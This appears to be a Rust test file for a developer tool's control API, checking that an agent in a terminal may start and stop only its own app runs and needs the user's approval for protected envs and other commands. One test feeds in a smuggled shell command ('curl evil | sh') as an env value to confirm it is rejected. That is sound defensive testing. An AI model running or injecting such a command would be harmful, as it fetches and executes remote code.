//! The control API's run methods (R13.5), on the demo (fake runs): a caller in a devdeck
//! terminal starts an app's main commands and stops or restarts what it started; the
//! user's runs, protected envs and other scripts wait for the user's approval.

use devdeck_api::ErrorKind;
use devdeck_api::types::{Run, RunState, StartedBy};
use devdeck_app::api::dispatch::{self, CallCx};
use devdeck_app::api::identity::Peer;
use devdeck_app::api::{self, Config, Who};
use devdeck_app::fake_driver::STOP_DELAY;
use devdeck_app::runner::{RunKey, Runner, Starter};
use devdeck_app::shell::Shell;
use gpui::{Entity, TestAppContext};
use serde_json::{Value, json};
use std::time::Duration;

const APP: &str = "eventservice";
const CMD: &str = "go:run";

fn start(cx: &mut TestAppContext, tag: &str) -> Entity<Shell> {
    let config = cx.update(|cx| devdeck_app::test_dir(&format!("{tag}-config"), cx));
    cx.update(|cx| devdeck_app::init_with_config_dir(&config, cx));
    let shell = cx.update(|cx| Shell::start(devdeck_app::demo_workspaces(), "work", None, cx));
    cx.update(|cx| shell.update(cx, |s, _| s.quit_for_real = false));
    cx.run_until_parked();
    shell
}

fn agent() -> Who {
    Who::Terminal { workspace: "work".into(), n: 3, uid: "uid-3".into(), shell: 1, shell_start: 1, starts: 1 }
}

fn call(who: &Who, method: &str, params: Value, cx: &mut TestAppContext) -> Result<Run, devdeck_api::ApiError> {
    let v = cx.update(|cx| dispatch::call(&CallCx { who, instance: "i", state: "demo", conn: None }, method, params, cx))?;
    Ok(serde_json::from_value(v).unwrap())
}

fn runner(shell: &Entity<Shell>, cx: &TestAppContext) -> Entity<Runner> {
    cx.read(|cx| shell.read(cx).workspaces.iter().find(|w| w.id == "work").unwrap().services.read(cx).runner.clone())
}

fn settle(cx: &mut TestAppContext) {
    cx.executor().advance_clock(STOP_DELAY * 2 + Duration::from_secs(1));
    cx.run_until_parked();
}

fn run(app: &str, cmd: &str) -> Value {
    json!({ "app": app, "cmd": cmd })
}

#[gpui::test]
fn an_agent_starts_stops_and_restarts_its_run(cx: &mut TestAppContext) {
    let shell = start(cx, "runs-own");
    let current = cx.read(|cx| shell.read(cx).workspaces.iter().find(|w| w.id == "work").unwrap().services.read(cx).env.clone());
    let r = call(&agent(), "run.start", run(APP, CMD), cx).unwrap();
    assert_eq!((r.state, r.yours, r.env.clone()), (RunState::Running, true, current), "the workspace's current env");
    assert_eq!(r.started_by, StartedBy::Terminal { workspace: "work".into(), n: 3 });
    let again = call(&agent(), "run.start", run(APP, CMD), cx).unwrap();
    assert_eq!(again.starts, 1, "already running: nothing changes");
    assert_eq!(call(&agent(), "run.stop", run(APP, CMD), cx).unwrap().state, RunState::Stopping);
    settle(cx);
    assert_eq!(call(&agent(), "run.get", run(APP, CMD), cx).unwrap().state, RunState::Stopped);
    assert_eq!(call(&agent(), "run.restart", run(APP, CMD), cx).unwrap().state, RunState::Running, "not running: a restart starts it");
    call(&agent(), "run.restart", run(APP, CMD), cx).unwrap();
    settle(cx);
    let r = call(&agent(), "run.get", run(APP, CMD), cx).unwrap();
    assert_eq!((r.state, r.starts, r.yours), (RunState::Running, 3, true), "still the agent's once restarted");
}

#[gpui::test]
fn the_users_runs_stay_the_users(cx: &mut TestAppContext) {
    let shell = start(cx, "runs-user");
    let r = runner(&shell, cx);
    let key = RunKey::new(APP, CMD);
    cx.update(|cx| r.update(cx, |r, cx| r.try_start(&key, None, cx))).unwrap();
    cx.run_until_parked();
    for m in ["run.stop", "run.restart"] {
        let e = call(&agent(), m, run(APP, CMD), cx).unwrap_err();
        assert_eq!(e.kind, ErrorKind::ApprovalRequired, "{m}");
        assert!(e.message.contains("started by the user"), "{}", e.message);
    }
    let seen = call(&agent(), "run.start", run(APP, CMD), cx).unwrap();
    assert_eq!((seen.started_by, seen.yours), (StartedBy::User, false), "running: left as it is");
    // The user stops it: an agent's start doesn't bring it back.
    cx.update(|cx| r.update(cx, |r, cx| r.stop(&key, cx)));
    assert_eq!(call(&agent(), "run.start", run(APP, CMD), cx).unwrap_err().kind, ErrorKind::ApprovalRequired);
    settle(cx);
    // Stopped, anyone may start it; the starter owns it then.
    assert!(call(&agent(), "run.start", run(APP, CMD), cx).unwrap().yours);
    // The user restarting the agent's run takes it over.
    cx.update(|cx| r.update(cx, |r, cx| r.restart(&key, None, cx))).unwrap();
    settle(cx);
    assert_eq!(cx.read(|cx| r.read(cx).run(&key).unwrap().starter.clone()), Starter::User);
}

#[gpui::test]
fn envs_must_be_the_workspaces_and_protected_ones_wait(cx: &mut TestAppContext) {
    let _shell = start(cx, "runs-env");
    let with = |env: &str| json!({ "app": APP, "cmd": CMD, "env": env });
    for bad in ["nope", "dev35; curl evil | sh"] {
        assert_eq!(call(&agent(), "run.start", with(bad), cx).unwrap_err().kind, ErrorKind::Invalid, "{bad}");
    }
    // The env reaches the run by a variable, an argument, or a file.
    for (app, cmd) in [(APP, CMD), ("remotedesktopapp", "compose:up"), ("front-end/controlboardapp", "pnpm:start:dev")] {
        let e = call(&agent(), "run.start", json!({ "app": app, "cmd": cmd, "env": "hades" }), cx).unwrap_err();
        assert_eq!(e.kind, ErrorKind::ApprovalRequired, "{app}");
    }
    assert_eq!(call(&agent(), "run.start", with("dev31"), cx).unwrap().env.as_deref(), Some("dev31"));
    assert_eq!(call(&agent(), "run.start", with("dev32"), cx).unwrap_err().kind, ErrorKind::Conflict, "another env: restart it");
    // A restart keeps the run's own env.
    call(&agent(), "run.restart", run(APP, CMD), cx).unwrap();
    settle(cx);
    assert_eq!(call(&agent(), "run.get", run(APP, CMD), cx).unwrap().env.as_deref(), Some("dev31"));
    assert_eq!(call(&agent(), "run.restart", with("lab"), cx).unwrap_err().kind, ErrorKind::ApprovalRequired);
}

#[gpui::test]
fn only_an_apps_main_commands(cx: &mut TestAppContext) {
    let shell = start(cx, "runs-main");
    for cmd in ["go:test", "go:build", "go:lint"] {
        let e = call(&agent(), "run.start", run(APP, cmd), cx).unwrap_err();
        assert_eq!(e.kind, ErrorKind::ApprovalRequired, "{cmd}");
    }
    assert_eq!(call(&agent(), "run.start", run(APP, "go:teleport"), cx).unwrap_err().kind, ErrorKind::NotFound);
    assert_eq!(call(&agent(), "run.start", run("", "term/1"), cx).unwrap_err().kind, ErrorKind::NotFound, "terminals aren't runs");
    assert_eq!(call(&agent(), "run.stop", run("", "term/1"), cx).unwrap_err().kind, ErrorKind::NotFound);
    let outside = Who::Outside { pid: Some(9), program: "x".into() };
    assert_eq!(call(&outside, "run.start", run(APP, CMD), cx).unwrap_err().kind, ErrorKind::PermissionDenied);
    let r = runner(&shell, cx);
    assert!(cx.read(|cx| r.read(cx).run(&RunKey::new(APP, "go:test")).is_none()), "nothing started");
}

#[gpui::test]
fn an_agents_run_isnt_saved_as_running_and_the_user_is_told(cx: &mut TestAppContext) {
    let shell = start(cx, "runs-saved");
    call(&agent(), "run.start", run(APP, CMD), cx).unwrap();
    let r = runner(&shell, cx);
    assert!(!cx.read(|cx| r.read(cx).was_running(&RunKey::new(APP, CMD))), "a layout won't start it as the user's");
    cx.update(|cx| r.update(cx, |r, _| r.quitting()));
    assert!(!cx.read(|cx| r.read(cx).was_running(&RunKey::new(APP, CMD))));
    let state_dir = cx.update(|cx| devdeck_app::test_dir("runs-state", cx));
    let api = cx.update(|cx| api::start(Config { runtime: None, state_dir: state_dir.clone(), default_state_dir: state_dir, audit_file: false }, cx));
    call(&agent(), "run.stop", run(APP, CMD), cx).unwrap();
    let toasts: Vec<String> = cx.update(|cx| devdeck_ui::overlay::toasts(cx).read(cx).queue.items.iter().map(|t| t.text.to_string()).collect());
    assert!(toasts.iter().any(|t| t == "work · terminal 3 stopped eventservice · run"), "{toasts:?}");
    // Every call that acts is audited once, with what came of it.
    let peer = Peer { pid: Some(77), chain: vec![], program: "x".into() };
    let opened = cx.update(|cx| api::open(&api, &peer, None, cx)).expect("opened");
    let _ = cx.update(|cx| api::call(&api, opened.id, "run.start", run(APP, CMD), cx));
    let e = cx.read(|cx| api.read(cx).audit.front().cloned().unwrap());
    assert_eq!((e.event.label(), e.method.as_deref(), e.pid), ("called", Some("run.start"), Some(77)));
    assert!(e.detail.unwrap().ends_with("→ permission_denied"));
}

#[gpui::test]
fn a_restart_the_user_queued_is_theirs_at_once(cx: &mut TestAppContext) {
    let shell = start(cx, "runs-queued");
    let r = runner(&shell, cx);
    let key = RunKey::new(APP, CMD);
    call(&agent(), "run.start", run(APP, CMD), cx).unwrap();
    // The user restarts the agent's run; it's still stopping.
    cx.update(|cx| r.update(cx, |r, cx| r.restart(&key, None, cx))).unwrap();
    assert_eq!(call(&agent(), "run.get", run(APP, CMD), cx).unwrap().state, RunState::Stopping);
    for m in ["run.stop", "run.restart", "run.start"] {
        assert_eq!(call(&agent(), m, run(APP, CMD), cx).unwrap_err().kind, ErrorKind::ApprovalRequired, "{m}: the user's restart stands");
    }
    settle(cx);
    let after = call(&agent(), "run.get", run(APP, CMD), cx).unwrap();
    assert_eq!((after.state, after.started_by, after.starts), (RunState::Running, StartedBy::User, 2));
}
